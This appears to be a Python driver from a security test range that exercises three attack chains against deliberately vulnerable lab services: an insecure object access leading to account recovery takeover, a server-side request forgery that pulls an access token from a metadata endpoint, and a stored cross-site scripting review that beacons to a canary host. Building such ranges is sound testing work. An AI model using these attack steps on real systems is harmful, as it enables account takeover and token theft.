"""Ground-truth-only chain driver for range acceptance; never projected to engines."""

from __future__ import annotations

from uuid import uuid4

from aegis_range.controller import ChainResult, RangeController
from aegis_range.runtime import Mode


async def exercise_chain(controller: RangeController, chain_id: str, mode: Mode) -> ChainResult:
    if chain_id == "bank-recovery-chain-v1":
        return await _bank(controller, mode)
    if chain_id == "cloud-service-chain-v1":
        return await _cloud(controller, mode)
    if chain_id == "shop-viewer-chain-v1":
        return await _shop(controller, mode)
    raise ValueError("CHAIN_NOT_IN_RANGE_INVENTORY")


async def _bank(controller: RangeController, mode: Mode) -> ChainResult:
    await controller.select_mode("aegis-bank", "bank-object-access-v1", mode)
    target = controller._target("aegis-bank")
    async with controller._client(target) as client:
        exposed = await client.get(
            "/api/accounts/ACC-200", headers={"Authorization": "Bearer range-user-alex"}
        )
        token = ""
        if exposed.status_code == 200:
            reference = str(exposed.json().get("recovery_reference", ""))
            recovered = await client.post(
                "/api/access/complete",
                json={"reference": reference, "new_passcode": "fresh-synthetic-pass"},
            )
            if recovered.status_code == 200:
                token = str(recovered.json().get("access_token", ""))
    return await controller.evaluate_chain(
        "bank-recovery-chain-v1",
        {"object_status": exposed.status_code, "access_token": token},
    )


async def _cloud(controller: RangeController, mode: Mode) -> ChainResult:
    await controller.select_mode("aegis-cloud", "cloud-integration-fetch-v1", Mode.VULNERABLE)
    await controller.select_mode("aegis-cloud", "cloud-metadata-response-v1", Mode.VULNERABLE)
    await controller.select_mode("aegis-cloud", "cloud-service-access-v1", mode)
    target = controller._target("aegis-cloud")
    async with controller._client(target) as client:
        metadata = await client.post(
            "/api/integrations/check",
            json={"url": "http://range-canary:8500/status/instance"},
        )
    token = ""
    if metadata.status_code == 200:
        token = str(metadata.json().get("result", {}).get("access_token", ""))
    return await controller.evaluate_chain(
        "cloud-service-chain-v1",
        {"metadata_status": metadata.status_code, "access_token": token},
    )


async def _shop(controller: RangeController, mode: Mode) -> ChainResult:
    await controller.select_mode("aegis-shop", "shop-review-content-v1", mode)
    nonce = uuid4().hex[:16]
    content = (
        "<script>new Image().src='http://shop-effect-canary:8800/effect/" + nonce + "'</script>"
    )
    target = controller._target("aegis-shop")
    async with controller._client(target) as client:
        stored = await client.post(
            "/api/reviews", json={"product_id": "PRD-100", "content": content}
        )
    async with controller._service_client("shop-browser", "http://shop-browser:8650") as client:
        browser = await client.post(
            "/v1/view", json={"url": "http://aegis-shop-view:8102/internal/reviews/view"}
        )
    return await controller.evaluate_chain(
        "shop-viewer-chain-v1",
        {
            "stored_status": stored.status_code,
            "browser_status": browser.status_code,
            "effect_reference": nonce,
        },
    )
